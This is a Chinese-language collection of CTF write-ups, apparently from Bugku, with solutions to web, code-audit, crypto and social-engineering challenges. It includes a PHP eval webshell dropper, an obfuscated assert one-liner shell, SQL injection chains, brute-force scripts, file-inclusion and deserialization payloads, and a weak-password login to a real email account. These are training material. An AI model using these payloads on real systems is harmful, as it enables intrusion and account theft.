	error_reporting(0);
	if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
	$file=$_GET['file'];
	if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
		echo "Oh no!";
		exit();
	}
	include($file); 
//flag:flag{edulcni_elif_lacol_si_siht}
?>
</html>

```

#### phpcmsV9
> 一个靶机而已，别搞破坏。
> 多谢各位大侠手下留情，flag在根目录里txt文件里
> http://120.24.86.145:8001/

```php
网站已经浑身是马了,随意找一个
//view-source:http://120.24.86.145:8001/html/special/test000/
<?php file_put_contents('tiny.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==')); ?>
//<?php @eval($_POST[pass]);?>
菜刀连上后拿到一张[flag.jpg](http://120.24.86.145:8001/flag.jpg)，
图片末尾隐藏有字符串 flag{admin_a23-ae2132_key}
```

#### 海洋CMS

> 地址：http://120.24.86.145:8008/
>
> flag在根目录某个txt里

扫到flag.php，flag{felege-ctf-2017_04}。

#### 输入密码查看flag

> http://120.24.86.145:8002/baopo/
>
> 作者：Se7en

直说爆破了，用burp的intruder，Payload Position选`pwd=§1§§1§§1§§1§§1§` ，Attack Type选Cluster bomb，payload option选数字，共十万种可能，慢慢等。也可以写个小脚本跑跑。最后密码是13579。

```python
#coding:utf8
import requests,itertools,string
u="http://120.24.86.145:8002/baopo/"
d=string.digits
req=requests.session()
cnt=0
for i in itertools.product(d,d,d,d,d):
	data={"pwd":''.join(i)}
	r=req.post(u,data=data)
	cnt=cnt+1
	if "密码不正确" not in r.content:
		print "correct,",data
	if cnt%1000==0:
		print cnt
```

`flag{bugku-baopo-hah}` 

#### 前女友

> http://47.93.190.246:49162/
> flag格式：SKCTF{xxxxxxxxxxxxxxxxxx}

```php
//http://47.93.190.246:49162/code.txt
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
?>
```

`http://47.93.190.246:49162/?v1[]=&v2[]=1&v3[]=`

向md5()或strcmp()传入数组会返回null，null为假。

`SKCTF{Php_1s_tH3_B3St_L4NgUag3}` 

#### 点击一百万次

> http://120.24.86.145:9001/test/

```javascript
<script>
    var clicks=0
    $(function() {
      $("#cookie")
        .mousedown(function() {
          $(this).width('350px').height('350px');
        })
        .mouseup(function() {
          $(this).width('375px').height('375px');
          clicks++;
          $("#clickcount").text(clicks);
          if(clicks >= 1000000){
          	var form = $('<form action="" method="post">' +
						'<input type="text" name="clicks" value="' + clicks + '" hidden/>' +
						'</form>');
						$('body').append(form);
						form.submit();
          }
        });
    });
  </script>
```

JavaScript代码表示当clicks大于1M时post一个数据包，所以直接post `clicks=1000001` 得到`flag{Not_C00kI3Cl1ck3r}`  。

#### 备份是个好习惯

> <http://120.24.86.145:8002/web16/>
>
> 听说备份是个好习惯

扫到index.php.bak

```php
<?php
/**
 * Created by PhpStorm.
 * User: Norse
 * Date: 2017/8/6
 * Time: 20:22
*/

include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```

访问`http://120.24.86.145:8002/web16/?kkeyey1[]&kkeyey2[]=1` 得到`Bugku{OH_YOU_FIND_MY_MOMY}` 

#### 成绩单

> 快来查查成绩吧
> http://120.24.86.145:8002/chengjidan/

简单的sql注入

```html
url:http://120.24.86.145:8002/chengjidan/index.php
post:
id=2' and 1=0 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#
//fl4g,sc

id=2' and 1=0 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c3467#
//skctf_flag

id=2' and 1=0 union select 1,2,3,skctf_flag from fl4g#
//BUGKU{Sql_INJECT0N_4813drd8hz4}
```

#### 秋名山老司机

> http://120.24.86.145:8002/qiumingshan/

```python
import requests,re
u="http://120.24.86.145:8002/qiumingshan/"
r=requests.session()
res=eval(re.findall("<div>(.*)=",r.get(u).content)[0])
print r.post(u,data={"value":str(res)}).content
# 原来你也是老司机 Bugku{YOU_DID_IT_BY_SECOND}
```

#### 速度要快

> 速度要快！！！！！！
>
> http://120.24.86.145:8002/web6/
>
> 格式KEY{xxxxxxxxxxxxxx}

```html
抓包发现响应头有额外键值对
flag: 6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogT1RjeU5EYzQ=
值解码后为 跑的还不错，给你flag吧: NjE0NzY4
响应包内容如下
</br>我感觉你得快点!!!<!-- OK ,now you have to post the margin what you find -->
```

要留意保持session。

```python
import requests
import base64
url = 'http://120.24.86.145:8002/web6/'
ses=requests.session()
r = ses.get(url)
key = base64.b64decode(base64.b64decode(r.headers['flag']).split(' ')[1])
print ses.post(url, data={'margin': key}).content
#KEY{111dd62fcd377076be18a}
```

#### cookie欺骗

> http://120.24.86.145:8002/web11/
>
> 答案格式：KEY{xxxxxxxx}

重定向至`http://120.24.86.145:8002/web11/index.php?line=&filename=a2V5cy50eHQ=` ，发现可读源码。

```python
import requests
for i in xrange(30):
	url='http://120.24.86.145:8002/web11/index.php?line=%d&filename=aW5kZXgucGhw'%i
	print requests.get(url).content.strip()
```

读到`index.php` 如下

```php
<?php
error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;
if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
$file_list = array(
'0' =>'keys.txt',
'1' =>'index.php',
);

if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
$file_list[2]='keys.php';
}

if(in_array($file, $file_list)){
$fa = file($file);
echo $fa[$line];
}
?>
```

进一步读取`keys.php` 

```python
import requests,base64
for i in xrange(30):
	url='http://120.24.86.145:8002/web11/index.php?line=%d&filename=%s'%(i,base64.b64encode('keys.php'))
	print requests.get(url,headers={'cookie':'margin=margin'}).content.strip()
```

读到`keys.php` 内容如下：

```php
<?php $key='KEY{key_keys}'; ?>
```

#### XSS

> http://103.238.227.13:10089/
>
> Flag格式:Flag:xxxxxxxxxxxxxxxxxxxxxxxx

```html
关键代码：
<body>
  <div class="container">
    <h2>XSS注入测试</h2>
    <div class="alert alert-success">
      <p>1、请注入一段XSS代码，获取Flag值</p>
      <p>2、必须包含alert(_key_)，_key_会自动被替换</p>
    </div>
    <div id="s"></div>
  </div>
<script>var s="";	document.getElementById('s').innerHTML = s;</script>
</body>
============================================================
利用Unicode编码绕过
url: http://103.238.227.13:10089/?id=\u003c_key_\u003e
Flag: 17f094325e90085b30a5ddefce34acd8
```

#### never give up

> http://120.24.86.145:8006/test/hello.php
>
> 作者：御结冰城

```php
直接访问120.24.86.145:8006/test/1p.html会被重定向
访问view-source:http://120.24.86.145:8006/test/1p.html得到
var Words ="%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" ;
print unescape(Words) //on chrome console
//<script>window.location.href='http://www.bugku.com';</script> 
<!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==-->
print unescape(atob('JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ=='))
-------------------------------------------
if(!$_GET['id']){
	header('Location: hello.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.')){
	echo 'no no no no no no no';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4){
	require("f4l2a3g.txt");
}  
else{ 
	print "never never never give up !!!";
}
?>
```

```php
http://120.24.86.145:8006/test/f4l2a3g.txt
得到flag{tHis_iS_THe_fLaG}
或者a=php://input&id=0&b=%00findneo....。。？？？？？？？
```

#### welcome to bugkuctf

> http://120.24.86.145:8006/test1/
>
> 作者：pupil

```php
$user = $_GET["txt"];  
$file = $_GET["file"];  
$pass = $_GET["password"];  
  
if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
    echo "hello admin!<br>";  
    include($file); //hint.php  
}else{  
    echo "you are not admin ! ";  
}  
```

```php
//http://120.24.86.145:8006/test1/?file=php://filter/convert.base64-encode/resource=index.php&txt=php://input
//post welcome to the bugkuctf
//index.php
<?php  
$txt = $_GET["txt"];  
$file = $_GET["file"];  
$password = $_GET["password"];  
  
if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){  
    echo "hello friend!<br>";  
    if(preg_match("/flag/",$file)){ 
		echo "不能现在就给你flag哦";
        exit();  
    }else{  
        include($file);   
        $password = unserialize($password);  
        echo $password;  
    }  
}else{  
    echo "you are not the number of bugku ! ";  
}  
  
?>  
  
<!--  
$user = $_GET["txt"];  
$file = $_GET["file"];  
$pass = $_GET["password"];  
  
if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
    echo "hello admin!<br>";  
    include($file); //hint.php  
}else{  
    echo "you are not admin ! ";  
}  
 -->  
   
   
-----------------------------------------------------------------------------------
//http://120.24.86.145:8006/test1/?file=php://filter/convert.base64-encode/resource=hint.php&txt=php://input
//post welcome to the bugkuctf
//hint.php
<?php  
class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
			echo "<br>";
		return ("good");
        }  
    }  
}  
?>  
```

考察PHP反序列化。

```php
<?php  
class Flag{
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
			echo "<br>";
		return ("good");
        }  
    }  
}  

$f=new Flag();
$f->file='flag.php';
var_dump(serialize($f));
//string(41) "O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}"
?>  
-------------------------------------------------------------------------
访问
view-source:http://120.24.86.145:8006/test1/?file=hint.php&txt=php://input&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
同时post welcome to the bugkuctf
得到 flag{php_is_the_best_language}  
```

#### login

> http://47.93.190.246:49163/
> flag格式：SKCTF{xxxxxxxxxxxxxxxxx}
> hint:SQL约束攻击

注册一个用户名为`admin                                                 1` ，密码随意的用户，然后用admin和该密码登陆。`SKCTF{4Dm1n_HaV3_GreAt_p0w3R}` 

参考： http://www.freebuf.com/articles/web/124537.html

#### 过狗一句话

> http://120.24.86.145:8010/
>
> 送给大家一个过狗一句话
>
> ```php
> <?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?>
> ```

```php
view-source:http://120.24.86.145:8010/?s=var_dump(scandir('.'))
view-source:http://120.24.86.145:8010/?s=var_dump(file_get_contents('flag.txt'))
string(25) "BUGKU{bugku_web_009801_a}"
```

#### maccms - 苹果cms

> 地址：http://120.24.86.145:8009/



#### appcms

> http://120.24.86.145:8012/
>
> flag在根目录



#### 小明的博客

> http://120.24.86.145:9003/
>
> 请勿破坏靶场



#### 各种绕过哟

> 各种绕过哟
>
> http://120.24.86.145:8002/web7/

```php
<?php 
highlight_file('flag.php'); 
$_GET['id'] = urldecode($_GET['id']); 
$flag = 'flag{xxxxxxxxxxxxxxxxxx}'; 
if (isset($_GET['uname']) and isset($_POST['passwd'])) { 
    if ($_GET['uname'] == $_POST['passwd']) 
        print 'passwd can not be uname.'; 
    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin')) 
        die('Flag: '.$flag); 
    else 
        print 'sorry!'; 
} ?>
```

```php
http://120.24.86.145:8002/web7/?uname[]=&id=margin
post passwd[]=1
 Flag: flag{HACK_45hhs_213sDD}
```

#### WEB8

> txt？？？？
>
> http://120.24.86.145:8002/web8/

```php
<?php
extract($_GET);
if (!empty($ac)){
	$f = trim(file_get_contents($fn));
	if ($ac === $f){
		echo "<p>This is flag:" ." $flag</p>";
	}
	else{
		echo "<p>sorry!</p>";
}
}
?>
```

```php
http://120.24.86.145:8002/web8/?ac=findneo&fn=php://input
post findneo
This is flag: flag{3cfb7a90fc0de31}
```

#### 字符？正则？

> 字符？正则？
>
> http://120.24.86.145:8002/web10/

```php
<?php 
highlight_file('2.php');
$key='KEY{********************************}';
$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
if( $IM ){ 
  die('key is: '.$key);
}
?>
```

```php
http://120.24.86.145:8002/web10/?id=keykeyxxxxkey:/x/keyp[:punct:]
 key is: KEY{0x0SIOPh550afc}
```

#### 考细心

> 地址：http://120.24.86.145:8002/web13/
>
> 想办法变成admin

扫描到 `robots.txt`，发现`/resusl.php` 页面响应中有`if ($_GET[x]==$password) foo` 。

访问`/web13/resusl.php?x=admin` 得到`flag(ctf_0098_lkji-s)` 。

#### 代码审计

> http://120.24.86.145:8002/web14/
>
> 数据库没弄好 先别做这个题

```php
﻿<?php

include "config.php";

class HITCON{
    private $method;
    private $args;
    private $conn;

    public function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;

        $this->__conn();
    }

    function show() {
        list($username) = func_get_args();
        $sql = sprintf("SELECT * FROM users WHERE username='%s'", $username);

        $obj = $this->__query($sql);
        if ( $obj != false  ) {
            $this->__die( sprintf("%s is %s", $obj->username, $obj->role) );
        } else {
            $this->__die("Nobody Nobody But You!");
        }
        
    }

    function login() {
        global $FLAG;

        list($username, $password) = func_get_args();
        $username = strtolower(trim(mysql_escape_string($username)));
        $password = strtolower(trim(mysql_escape_string($password)));

        $sql = sprintf("SELECT * FROM users WHERE username='%s' AND password='%s'", $username, $password);

        if ( $username == 'orange' || stripos($sql, 'orange') != false ) {
            $this->__die("Orange is so shy. He do not want to see you.");
        }

        $obj = $this->__query($sql);
        if ( $obj != false && $obj->role == 'admin'  ) {
            $this->__die("Hi, Orange! Here is your flag: " . $FLAG);
        } else {
            $this->__die("Admin only!");
        }
    }

    function source() {
        highlight_file(__FILE__);
    }

    function __conn() {
        global $db_host, $db_name, $db_user, $db_pass, $DEBUG;

        if (!$this->conn)
            $this->conn = mysql_connect($db_host, $db_user, $db_pass);
        mysql_select_db($db_name, $this->conn);

        if ($DEBUG) {
            $sql = "CREATE TABLE IF NOT EXISTS users ( 
                        username VARCHAR(64), 
                        password VARCHAR(64), 
                        role VARCHAR(64)
                    ) CHARACTER SET utf8";
            $this->__query($sql, $back=false);

            $sql = "INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')";
            $this->__query($sql, $back=false);
        } 

        mysql_query("SET names utf8");
        mysql_query("SET sql_mode = 'strict_all_tables'");
    }

    function __query($sql, $back=true) {
        $result = @mysql_query($sql);
        if ($back) {
            return @mysql_fetch_object($result);
        }
    }

    function __die($msg) {
        $this->__close();

        header("Content-Type: application/json");
        die( json_encode( array("msg"=> $msg) ) );
    }

    function __close() {
        mysql_close($this->conn);
    }

    function __destruct() {
        $this->__conn();

        if (in_array($this->method, array("show", "login", "source"))) {
            @call_user_func_array(array($this, $this->method), $this->args);
        } else {
            $this->__die("What do you do?");
        }

        $this->__close();
    }

    function __wakeup() {
        foreach($this->args as $k => $v) {
            $this->args[$k] = strtolower(trim(mysql_escape_string($v)));
        }
    }
}

if(isset($_GET["data"])) {
    @unserialize($_GET["data"]);    
} else {
    new HITCON("source", array());
}
```



#### 求getshell

> 求getshell
>
> http://120.24.86.145:8002/web9/



#### flag.php

> 地址：http://120.24.86.145:8002/flagphp/
>
> 点了login咋没反应
>
> 提示：hint

根据提示访问`http://120.24.86.145:8002/flagphp/?hint=1` 

```php
<?php 
error_reporting(0); 
include_once("flag.php"); 
$cookie = $_COOKIE['ISecer']; 
if(isset($_GET['hint'])){ 
    show_source(__FILE__); 
} 
elseif (unserialize($cookie) === "$KEY") {    
    echo "$flag"; 
} 
else { 
?> 
<html>foo </html> 
<?php 
} 
$KEY='ISecer:www.isecer.com'; 
?>
```

本以为请求头cookie添加键值对`ISecer:s:21:"ISecer:www.isecer.com";` 即可。但这里很有趣，因为此处$KEY值仍为空，所以添加的键值对是`ISecer:s:0:"";` 。`flag{unserialize_by_virink}` 

```php
<?php 
var_dump($foo);
$foo='foo'; 
var_dump($foo);
var_dump($bar);
?>
<?php
$bar='bar';
var_dump($bar);
---------------运行结果如下----------
Notice: Undefined variable: foo in C:\Users\*\Desktop\tets.php on line 2
NULL
string(3) "foo"
Notice: Undefined variable: bar in C:\Users\*\Desktop\tets.php on line 5
NULL
string(3) "bar"
PHP Notice:  Undefined variable: foo in C:\Users\*\Desktop\tets.php on line 2
PHP Notice:  Undefined variable: bar in C:\Users\*\Desktop\tets.php on line 5
```

#### INSERT INTO注入

> ```PHP
> 地址：http://120.24.86.145:8002/web15/
>
> flag格式：flag{xxxxxxxxxxxx}
> 不如写个Python吧
>
> error_reporting(0);
>
> function getIp(){
> $ip = '';
> if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
> $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
> }else{
> $ip = $_SERVER['REMOTE_ADDR'];
> }
> $ip_arr = explode(',', $ip);
> return $ip_arr[0];
>
> }
>
> $host="localhost";
> $user="";
> $pass="";
> $db="";
>
> $connect = mysql_connect($host, $user, $pass) or die("Unable to connect");
>
> mysql_select_db($db) or die("Unable to select database");
>
> $ip = getIp();
> echo 'your ip is :'.$ip;
> $sql="insert into client_ip (ip) values ('$ip')";
> mysql_query($sql);
> ```



#### 文件包含2

> http://47.93.190.246:49166/
> flag格式：SKCTF{xxxxxxxxxxxxxxxx}
> hint:文件包含

重定向到`/index.php?file=hello.php` ，响应头提示`include.php` ,注释提示`upload.php` 。

```php
403
http://47.93.190.246:49166/admin.phps
http://47.93.190.246:49166/index.phps
http://47.93.190.246:49166/login.phps
http://47.93.190.246:49166/.htaccess
301
  http://47.93.190.246:49166/upload
200
  http://47.93.190.246:49166/upload.php
```



#### 实战2-注入

> http://www.kabelindo.co.id
>
> flag格式 flag{数据库最后一个表名字}



#### 这是一个神奇的登陆框

> http://120.24.86.145:9001/sql/
>
> flag格式flag{}



#### 多次

>  http://120.24.86.145:9004
>
>  本题有2个flag
>
>  flag格式 flag{}

```php
http://120.24.86.145:9004/1ndex.php?id=5%27||ascii(mid(database(),1,1))=ascii(%27w%27)--+


GET /1ndex.php?id=5%27||ascii(mid(database(),1,1))=119--+
''.join(map(chr,[119,101,98,49,48,48,50,45,49]))
'web1002-1'
 
http://120.24.86.145:9004/1ndex.php?id=5%27||ascii(mid(database(),1,1))%3E0--+
bingo="There is nothing"
ohno="You can do some SQL injection in here"
  
http://120.24.86.145:9004/1ndex.php?id=1%27||if(ascii(mid(select%20%22asdf%22,1,1))%3E0,sleep(10),0)--+

```



#### SQL注入2

> http://120.24.86.145:8007/web2/
>
> 全都tm过滤了绝望吗？
>
> 提示 !,!=,=,+,-,^,%



#### wordpress

> http://wp.bugku.com/
>
> 出题花了10分钟，应该很简单的，
>
> 进网站看看就明白了。
>
> 需要用到渗透测试第一步信息收集



#### login2

> http://47.93.190.246:49165/
> SKCTF{xxxxxxxxxxxxxxxxxxxxx}
> hint:union，命令执行
>
> 来源：山科大



#### login3

> http://47.93.190.246:49167/
> flag格式：SKCTF{xxxxxxxxxxxxx}
> hint：基于布尔的SQL盲注
>
> 来源：山科大



#### 报错注入

> http://103.238.227.13:10088/
> FLAG格式 Flag:””



#### 实战1-注入

> http://www.interplay.com
>
> flag格式 flag{数据库的第一个表名}



#### Trim的日记本

> http://120.24.86.145:9002/
>
> hint：不要一次就放弃



#### login4

> http://47.93.190.246:49168/
> flag格式：SKCTF{xxxxxxxxxxxxxxxx}
> hint:CBC字节翻转攻击
>
> 来源：山科大

### Social

#### 密码？？？

> 姓名：张三
> 生日；19970315
>
> KEY格式KEY{xxxxxxxxxx}

KEY{zs19970315}

#### 信息查找？？？

> 社会工程学基础题目 信息查找
>
> 听说bugku.cn 在今日头条上能找到？？
>
> 提示：flag为群号码
>
> 格式KEY{xxxxxxxxxxx}

访问`https://www.google.com/search?q=bugku.cn+site%3Atoutiao.com` ，得到`462713425` 

#### 入门题目，社工帝？

> name:孤长离
>
> 提示：弱口令

搜索孤长离到一个贴吧，弱口令登陆邮箱`bkctftest@163.com` 得到`KEY{sg1H78Si9C0s99Q}` 。

#### 简单的社工尝试

> 这个狗就是我画的，而且当了头像
> 这题提示的其实很明显了
> 想想吧

谷歌识图到达`https://github.com/bugku` ，然后到`https://weibo.com/bugku` ，然后是`http://c.bugku.com/13211.txt` ，就得到`flag{BUku_open_shgcx1}` 。

### Crypto

#### 滴答~滴

> -... -.- -.-. - ..-. -- .. ... -.-.
>
> 答案格式KEY{xxxxxxxxx}

`key{bkctfmisc}` 

推荐这个[小工具](https://github.com/findneo/fcode) 

#### 聪明的小羊

> 一只小羊翻过了2个栅栏
>
> KYsd3js2E{a2jda}

`KEY{sad23jjdsa2}` 

推荐这个[小工具](https://github.com/findneo/fcode) 

#### ok

[Ook!解混淆](https://www.splitbrain.org/services/ook) 

`flag{ok-ctf-1234-admin}` 

#### 这不是摩斯密码

[Brainfuck解混淆](https://www.splitbrain.org/services/ook) 

`flag{ok-c2tf-3389-admin}` 

#### +[]-

[Brainfuck解混淆](https://www.splitbrain.org/services/ook) 

`flag{bugku_jiami_23}`  

#### zip伪加密

将第六字节改为00即可。`flag{Adm1N-B2G-kU-SZIP} `

### 代码审计

#### md5()函数

```php
http://120.24.86.145:9009/18.php

<?php
error_reporting(0);
$flag = 'flag{test}';
if (isset($_GET['username']) and isset($_GET['password'])) {
if ($_GET['username'] == $_GET['password'])
print 'Your password can not be your username.';
else if (md5($_GET['username']) === md5($_GET['password']))
die('Flag: '.$flag);
else
print 'Invalid password';
}
?>
```

`http://120.24.86.145:9009/18.php?username[]=1&password[]=`

`Flag: flag{bugk1u-ad8-3dsa-2}` 

#### extract变量覆盖

```php
http://120.24.86.145:9009/1.php
<?php
$flag='xxx';
extract($_GET);
if(isset($shiyan))
{
$content=trim(file_get_contents($flag));
if($shiyan==$content)
{
echo'flag{xxx}';
}
else
{
echo'Oh.no';
}
}
?>
```

#### strcmp比较字符串

```php
http://120.24.86.145:9009/6.php

<?php
$flag = "flag{xxxxx}";
if (isset($_GET['a'])) {
if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。
//比较两个字符串（区分大小写）
die('Flag: '.$flag);
else
print 'No';
}
?>
```

`http://120.24.86.145:9009/6.php?a[]`

`Flag: flag{bugku_dmsj_912k}` 

#### urldecode二次编码绕过

```php
http://120.24.86.145:9009/10.php
<?php
if(eregi("hackerDJ",$_GET[id])) {
echo("
not allowed!
");
exit();
}
$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "hackerDJ")
{
echo "
Access granted!
";
echo "
flag
";
}
?>
```

`http://120.24.86.145:9009/10.php?id=hackerD%254a`

`flag{bugku__daimasj-1t2} ` 

#### 数组返回NULL绕过

```php
http://120.24.86.145:9009/19.php
<?php
$flag = "flag";
if (isset ($_GET['password'])) {
if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
echo 'You password must be alphanumeric';
else if (strpos ($_GET['password'], '--') !== FALSE)
die('Flag: ' . $flag);
else
echo 'Invalid password';
}
?>
```

`http://120.24.86.145:9009/19.php?password=a%00--`

`flag{ctf-bugku-ad-2131212}` 

#### 弱类型整数大小比较绕过

```php
